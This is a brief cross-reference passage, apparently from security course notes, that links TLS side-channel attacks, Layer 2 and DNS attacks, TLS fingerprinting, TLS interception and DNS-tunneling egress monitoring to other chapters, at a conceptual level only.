**To Domain 7:** TLS padding oracles (Lucky13) and compression oracles (CRIME/BREACH) are classical timing side channels — the same observation-via-timing model as cache timing (Chapter 7A section 7). The post-quantum migration is motivated by the threat model that quantum computers could break current key exchanges, which is related to (but distinct from) the speculative-execution attacks on cryptographic implementations.

**To Chapter 9B:** ARP and Layer 2 attacks provide the network-level prerequisites for many TCP/IP attacks (MitM positioning for TCP hijacking, DNS poisoning on local networks). DNS security (section 2) is the naming layer that TLS certificate validation (section 3.9) depends on — DANE bridges the two. JA3/JA4+ fingerprinting (section 3.10) enables detection of malicious TLS clients across Layer 2 boundaries.

**To Chapter 9C:** TLS interception (section 3.11) intersects with enterprise security monitoring — the same proxy infrastructure used for DLP and threat detection. DNS tunneling (section 2.4) is a primary data exfiltration vector that must be addressed in egress monitoring (Chapter 9C section 2).
